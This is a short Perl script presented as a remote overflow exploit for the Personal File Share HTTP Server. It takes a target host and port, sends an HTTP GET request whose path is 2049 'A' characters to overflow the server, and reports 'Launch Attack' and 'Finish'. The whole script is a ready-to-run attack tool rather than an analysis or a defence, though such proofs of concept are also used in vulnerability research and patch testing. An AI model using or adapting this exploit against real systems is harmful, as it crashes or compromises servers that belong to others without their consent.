#!/usr/bin/perl -w
#Personal File Share HTTP Server Remote Overflow Vulnerability Exploit
#Written by demonalex () 163 com
use IO::Socket;
$|=1;
$host=shift || die "$0 \$host \$port\n";
$port=shift || die "$0 \$host \$port\n";
$evil = 'A'x2049;
$payload = 
"GET /"."$evil"." HTTP/1.0\r\n".
"Accept: */*\r\n".
"Accept-Language: zh-cn\r\n".
"UA-CPU: x86\r\n".
"Accept-Encoding: gzip, deflate\r\n".
"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 
3.0.4506.2152; .NET CLR 3.5.30729; 360SE)\r\n".
"Host: "."$host:$port"."\r\n".
"Connection: Keep-Alive\r\n\r\n";
print "Launch Attack ... ";
$sock1=IO::Socket::INET->new(PeerAddr=>$host, PeerPort=>$port, Proto=>'tcp', Timeout=>30) || die "HOST $host PORT $port 
is down!\n";
if(defined($sock1)){
        $sock1->send("$payload", 0);
        $sock1->close;
}
print "Finish!\n";
exit(1);
